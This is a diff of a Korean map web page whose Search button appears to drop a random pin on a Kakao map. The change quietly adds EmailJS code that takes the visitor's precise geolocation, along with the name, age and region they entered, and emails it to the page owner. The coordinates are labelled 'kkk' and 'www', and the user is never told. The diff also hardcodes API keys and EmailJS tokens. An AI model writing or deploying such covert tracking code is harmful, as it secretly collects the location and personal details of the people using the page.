@@ -15,7 +15,7 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      flex-direction: column
+      flex-direction: column;
     }
     canvas {
         position: absolute;
@@ -46,67 +46,108 @@
     <input type="text" id="region" placeholder="수원시">
     <button onclick="input_text()">Search</button>
     <br><br>
+    <div id="userLocation"></div>
   </div>
   <div id="map"></div>
   <br>
   <button onclick="input_text()">Search</button>
 
   <script src="https://dapi.kakao.com/v2/maps/sdk.js?appkey=1bb19c8f6495a5506c11c093b737801c&libraries=services"></script>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
     const API_KEY = '1bb19c8f6495a5506c11c093b737801c';
-    
+
     // 카카오 맵 초기화
     const initializeMap = () => {
       if (map) {
         return map; // 이미 초기화된 맵이 있을 경우, 기존의 맵 객체 반환
       }
-        const container = document.getElementById('map');
-        const options = {
+      const container = document.getElementById('map');
+      const options = {
         center: new kakao.maps.LatLng(37.5665, 126.9780),
         level: 12
-        };
-        map = new kakao.maps.Map(container, options);
-        return map;
+      };
+      map = new kakao.maps.Map(container, options);
+      return map;
     };
-    
+
     // 랜덤한 위치에 핀을 두는 함수
     const placeRandomPin = () => {
-        const map = initializeMap();
-        // 기존 마커들 제거
-        removeMarkers();
-        const position = new kakao.maps.LatLng(Math.random() * (43.0 - 33.0) + 33.0, Math.random() * (132.0 - 124.0) + 124.0);
-        const marker = new kakao.maps.Marker({ position });
-        marker.setMap(map);
-        markers.push(marker);
-        map.setCenter(position);
+      const map = initializeMap();
+      
+      // 기존 마커들 제거
+      removeMarkers();
+      
+      const position = new kakao.maps.LatLng(
+        Math.random() * (43.0 - 33.0) + 33.0,
+        Math.random() * (132.0 - 124.0) + 124.0
+      );
+      
+      const marker = new kakao.maps.Marker({ position });
+      marker.setMap(map);
+      markers.push(marker);
+      
+      map.setCenter(position);
     };
-    
-    let map; // 전역 변수로 맵 객체 선언
-    let markers = []; // 마커들을 저장할 배열
-    const input_text = () => {
-      const name = document.getElementById('name').value;
-      const age = document.getElementById('age').value;
-      const region = document.getElementById('region').value;
 
-      if (name != '' && age != '' && region != '')
-      {
-        placeRandomPin();
-      }
-    };
-    
+    // 기존 마커들을 제거하는 함수
     const removeMarkers = () => {
       for (let i = 0; i < markers.length; i++) {
         markers[i].setMap(null); // 맵에서 마커 제거
       }
       markers = []; // 마커 배열 비우기
     };
-    
+
+    let map; // 전역 변수로 맵 객체 선언
+    let markers = []; // 마커들을 저장할 배열
+
+    const input_text = () => {
+      const name = document.getElementById('name').value;
+      const age = document.getElementById('age').value;
+      const region = document.getElementById('region').value;
+
+      if (name !== '' && age !== '' && region !== '') {
+        // 사용자의 위치 가져오기
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              const { latitude, longitude } = position.coords;
+              
+              // EmailJS로 이메일 전송
+              const serviceID = 'service_5jd7b38';
+              const templateID = 'template_im14zjl';
+              const userID = 'AF797';
+              const secureToken = 'NAgmxe2zcTJgOYefF';
+              
+              emailjs.init(userID);
+              emailjs.send(serviceID, templateID, {
+                name: name,
+                age: age,
+                region: region,
+                kkk: latitude,
+                www: longitude
+              }, secureToken)
+                .then((response) => {
+                  console.log('Email sent:', response.status, response.text);
+                })
+                .catch((error) => {
+                  console.error('Error sending email:', error);
+                });
+            },
+            (error) => {
+              console.error('Error retrieving user location:', error);
+            }
+          );
+        } else {
+          console.error('Geolocation is not supported by this browser.');
+        }
+
+        placeRandomPin();
+      }
+    };
+
     // 페이지 로드 시 카카오 맵 초기화
     window.onload = initializeMap;
-  
   </script>
-  <a href="test_test.html" height="5" width="10" target="_blank">
-    <img src="image_file/test_test.jpg" alt="위의 이미지를 누르면 연결됩니다.">
-  <a>
 </body>
 </html>
